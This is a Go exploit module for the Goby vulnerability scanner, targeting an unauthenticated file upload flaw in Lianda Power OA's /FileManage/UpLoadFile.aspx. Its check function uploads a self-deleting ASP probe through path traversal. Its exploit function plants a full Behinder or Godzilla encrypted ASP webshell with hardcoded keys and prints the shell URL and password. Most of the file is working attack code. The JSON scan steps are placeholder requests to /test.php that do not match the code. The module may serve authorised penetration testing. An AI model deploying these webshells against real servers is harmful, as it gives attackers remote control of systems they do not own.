package exploits

import (
	"log"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Lianda Power OA /FileManage/UpLoadFile.aspx arbitrary File Upload Vulnerability",
    "Description": "<p>There is an unauthorized file upload vulnerability in Lianda Power OA /FileManage/UpLoadFile.aspx. An attacker can use this vulnerability to gain server control permissions.</p>",
    "Product": "Lkpower-OA",
    "Homepage": "http://www.lkpower.com/",
    "DisclosureDate": "2024-03-27",
    "PostTime": "2024-04-02",
    "Author": "Town",
    "FofaQuery": "(body=\"/LKSys_WindowControlScript.js\" || body=\"onload=\\\"LKSYS_PubMaxWin()\" || body=\"id=\\\"lkbLogin\\\" href=\\\"javascript:__doPostBack('lkbLogin','')\" || (body=\"IdentityValidator\" && body=\"HHCtrlMax\"))",
    "GobyQuery": "(body=\"/LKSys_WindowControlScript.js\" || body=\"onload=\\\"LKSYS_PubMaxWin()\" || body=\"id=\\\"lkbLogin\\\" href=\\\"javascript:__doPostBack('lkbLogin','')\" || (body=\"IdentityValidator\" && body=\"HHCtrlMax\"))",
    "Level": "3",
    "Impact": "<p>There is an unauthorized file upload vulnerability in Lianda Power OA /FileManage/UpLoadFile.aspx. An attacker can use this vulnerability to gain server control permissions.</p>",
    "Recommendation": "<p>Verify the size and type of uploaded files, and define a whitelist of uploaded file types.</p>",
    "References": [
        "https://blog.csdn.net/qq_40550150/article/details/137084093"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Behinder,Godzilla,customize"
        },
        {
            "name": "customize",
            "type": "input",
            "value": "",
            "show": "mode=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "联达动力OA /FileManage/UpLoadFile.aspx 文件上传漏洞",
            "Product": "联达OA",
            "Description": "<p>联达动力OA /FileManage/UpLoadFile.aspx 存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。<br></p>",
            "Recommendation": "<p>对上传文件的大小和类型进行校验，定义上传文件类型白名单。<br></p>",
            "Impact": "<p>联达动力OA /FileManage/UpLoadFile.aspx存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Lianda Power OA /FileManage/UpLoadFile.aspx arbitrary File Upload Vulnerability",
            "Product": "Lkpower-OA",
            "Description": "<p>There is an unauthorized file upload vulnerability in Lianda Power OA /FileManage/UpLoadFile.aspx. An attacker can use this vulnerability to gain server control permissions.<br></p>",
            "Recommendation": "<p>Verify the size and type of uploaded files, and define a whitelist of uploaded file types.<br></p>",
            "Impact": "<p>There is an unauthorized file upload vulnerability in Lianda Power OA /FileManage/UpLoadFile.aspx. An attacker can use this vulnerability to gain server control permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10940"
}`

	sendPayloadFlagrPDm := func(hostInfo *httpclient.FixUrl, filename string, checkStr string) (*httpclient.HttpResponse, error) {
		//判断后缀
		if !strings.HasSuffix(filename, ".asp") {
			filename += ".asp"
		}
		//构造Post请求
		postRequestConfig := httpclient.NewPostRequestConfig("/FileManage/UpLoadFile.aspx")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=00content0boundary00")
		//设置请求体
		postRequestConfig.Data = "--00content0boundary00\nContent-Disposition: form-data; name=\"DesignId\"\n\n1\n--00content0boundary00\nContent-Disposition: form-data; name=\"file\"; filename=\"../" + filename + "\"\nContent-Type: image/png\n\n" + checkStr + "\n--00content0boundary00--"

		//请求
		_, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}

		//构造Get请求
		getRequestConfig := httpclient.NewGetRequestConfig("/FileManage/" + filename)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//随机文件名
			filename := goutils.RandomHexString(16)
			checkStr := goutils.RandomHexString(16)
			checkStrAll := "<%Response.Write(\"" + checkStr + "\"):Set fso=CreateObject(\"Scripting.FileSystemObject\"):fso.DeleteFile(Server.MapPath(Request.ServerVariables(\"SCRIPT_NAME\"))) %>"
			rsp, err := sendPayloadFlagrPDm(hostInfo, filename, checkStrAll)
			if err != nil {
				return false
			}
			//设置扫描完成URL
			ss.VulURL = hostInfo.HostInfo + "/FileManage/UpLoadFile.aspx"
			return strings.Contains(rsp.Utf8Html, checkStr)
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := goutils.B2S(ss.Params["mode"])
			customize := goutils.B2S(ss.Params["customize"])
			var filename string
			var content string
			filename = goutils.RandomHexString(16)

			if mode == "Behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%
Response.CharSet = "UTF-8" 
k="e45e329feb5d925b"
Session("k")=k
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
%>`
			} else if mode == "Godzilla" {
				content = `<%
          Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")
          
          Function Base64Decode(ByVal vCode)
              Dim oXML, oNode
              Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
              Set oNode = oXML.CreateElement("base64")
              oNode.dataType = "bin.base64"
              oNode.text = vCode
              Base64Decode = oNode.nodeTypedValue
              Set oNode = Nothing
              Set oXML = Nothing
          End Function
          
          Function decryption(content,isBin)
              dim size,i,result,keySize
              keySize = len(key)
              Set BinaryStream = CreateObject("ADODB.Stream")
              BinaryStream.CharSet = "iso-8859-1"
              BinaryStream.Type = 2
              BinaryStream.Open
              if IsArray(content) then
                  size=UBound(content)+1
                  For i=1 To size
                      BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
                  Next
              end if
              BinaryStream.Position = 0
              if isBin then
                  BinaryStream.Type = 1
                  decryption=BinaryStream.Read()
              else
                  decryption=BinaryStream.ReadText()
              end if
          
          End Function
              key="3c6e0b8a9c15224a"
              content=request.Form("pass")
              if not IsEmpty(content) then
          
                  if  IsEmpty(Session("payload")) then
                      content=decryption(Base64Decode(content),false)
                      Session("payload")=content
                      response.End
                  else
                      content=decryption(Base64Decode(content),true)
                      bypassDictionary.Add "payload",Session("payload")
                      Execute(bypassDictionary("payload"))
                      result=run(content)
                      response.Write("11cd6a")
                      if not IsEmpty(result) then
                          response.Write Base64Encode(decryption(result,true))
                      end if
                      response.Write("ac826a")
                  end if
              end if
          %>`
			} else {
				content = customize
			}

			log.Println(content)
			if !strings.HasSuffix(filename, ".asp") {
				filename += ".asp"
			}

			//构造Post请求
			postRequestConfig := httpclient.NewPostRequestConfig("/FileManage/UpLoadFile.aspx")
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			//设置请求头
			postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=00content0boundary00")
			postRequestConfig.Data = "--00content0boundary00\nContent-Disposition: form-data; name=\"DesignId\"\n\n1\n--00content0boundary00\nContent-Disposition: form-data; name=\"file\"; filename=\"../" + filename + "\"\nContent-Type: image/png\n\n" + content + "\n--00content0boundary00--"

			//请求
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			// 资源存在
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			//设置输出
			if mode == "Behinder" {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/FileManage/" + filename + "\n"
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder\n"
				return expResult
			} else if mode == "Godzilla" {
				expResult.Output += "哥斯拉WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/FileManage/" + filename + "\n"
				expResult.Output += "Password: pass  Key: key \n"
				expResult.Output += "加密器：ASP_XOR_BASE64 \n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n\n"
				return expResult
			} else {
				expResult.Success = true
				expResult.Output += "自定义上传成功：URL: " + expResult.HostInfo.FixedHostInfo + "/FileManage/" + filename + "\n"
				return expResult
			}
		},
	))
}
